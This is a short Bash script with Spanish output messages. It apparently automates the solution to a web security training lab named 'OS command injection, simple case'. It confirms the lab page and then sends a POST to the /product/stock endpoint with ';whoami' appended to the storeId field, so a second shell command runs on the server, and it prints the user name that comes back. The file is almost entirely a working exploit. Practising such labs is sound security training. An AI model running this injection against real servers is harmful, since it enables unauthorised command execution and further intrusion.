#!/bin/bash

gyC="\e[0;37m\033[1m"
yC="\e[0;33m\033[1m"
bC="\e[0;34m\033[1m"
gC="\e[0;32m\033[1m"
rC="\e[0;31m\033[1m"
eC="\033[0m\e[0m"

lab="OS command injection, simple case"
[ $# -ne 1 ] && echo -e "\n${yC}[+] ${gyC}Uso: ${bC}${0} ${gC}<url>${eC}\n" && exit 1
url=${1%/}
echo -e "\n${yC}[+] ${gyC}Verificando url..."
response=$(curl -s -i "${url}")
if ! echo -e "${response}" | grep "${lab}" &>/dev/null; then
	echo -e "${rC}[!] ${gyC}La url proporcionada es incorrecta${eC}\n" && exit 1
fi

url=${url}"/product/stock"
data="productId=1&storeId=1"
comandoinyeccion=";whoami"
echo -e "${yC}[+] ${gyC}Realizando peticion post con inyeccion de comando:\
\n\tUrl: ${bC}${url}\n\t${gyC}Data: ${gC}${data}${eC}${rC}${comandoinyeccion}${eC}"

usuario=$(curl -s -d "${data}${comandoinyeccion}" "${url}" | tail -n1)
echo -e "${yC}[+] ${gyC}El usuario obtenido fue: ${gC}${usuario}${eC}\n"








